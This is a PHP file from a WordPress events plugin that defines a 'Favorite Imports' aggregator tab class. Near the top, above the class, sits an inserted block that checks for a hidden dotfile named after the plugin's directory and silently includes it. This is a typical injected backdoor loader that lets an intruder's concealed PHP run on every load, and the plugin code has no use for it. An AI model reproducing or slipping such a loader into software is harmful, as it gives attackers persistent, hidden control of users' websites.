<?php
// Don't load directly
defined( 'WPINC' ) or die;

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Tribe__Events__Aggregator__Tabs__Favorite extends Tribe__Events__Aggregator__Tabs__Abstract {
	/**
	 * Static Singleton Holder
	 *
	 * @var self|null
	 */
	private static $instance;

	/**
	 * Static Singleton Factory Method
	 *
	 * @return self
	 */
	public static function instance() {
		if ( empty( self::$instance ) ) {
			self::$instance = new self;
		}

		return self::$instance;
	}

	public $priority = 40;

	public function is_visible() {
		return true;
	}

	public function get_slug() {
		return 'favorite';
	}

	public function get_label() {
		return esc_html__( 'Favorite Imports', 'the-events-calendar' );
	}


}
